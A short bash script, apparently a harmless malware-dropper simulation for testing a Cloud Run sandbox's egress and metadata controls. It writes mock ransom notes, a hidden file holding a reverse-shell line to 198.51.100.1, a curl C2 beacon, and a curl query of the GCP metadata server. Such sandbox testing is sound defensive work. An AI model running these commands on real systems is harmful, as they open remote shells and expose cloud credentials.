#!/usr/bin/env bash
# SIMULATED MALWARE DROPPER (Harmless simulation for sandbox analysis)
echo "[*] Initializing simulated payload..."

# 1. Simulate dropping an encrypted payload and ransom note in /tmp and /
mkdir -p /tmp/.hidden_beacon
echo "MOCK_ENCRYPTED_DATA_BASE64_ABC123==" > /tmp/encrypted_user_data.lock
echo "MOCK_ENCRYPTED_DATA_BASE64_ABC123==" > /tmp/.hidden_beacon/encrypted_user_data.lock
cat << 'EOF' > /tmp/README_RESTORE_FILES.txt
YOUR FILES HAVE BEEN SIMULATED AS ENCRYPTED.
This is a harmless test artifact created inside a Cloud Run Sandbox.
EOF
cat << 'EOF' > /README_RESTORE_FILES.txt
YOUR FILES HAVE BEEN SIMULATED AS ENCRYPTED.
This is a harmless test artifact created inside a Cloud Run Sandbox.
EOF

# 2. Attempt persistence script creation in /tmp
echo "bash -i >& /dev/tcp/198.51.100.1/4444 0>&1" > /tmp/.hidden_beacon/backdoor.sh
chmod +x /tmp/.hidden_beacon/backdoor.sh

# 3. Attempt C2 Callback (Should fail due to deny-by-default egress)
echo "[*] Attempting C2 beacon to 198.51.100.1..."
curl -s --connect-timeout 2 http://198.51.100.1/beacon || echo "[!] C2 Beacon Blocked (Expected)"

# 4. Attempt to query GCP metadata server (Should fail due to zero-trust boundary)
echo "[*] Attempting GCP Metadata credential access..."
curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/ || echo "[!] Metadata Access Blocked (Expected)"

echo "[*] Simulation complete."
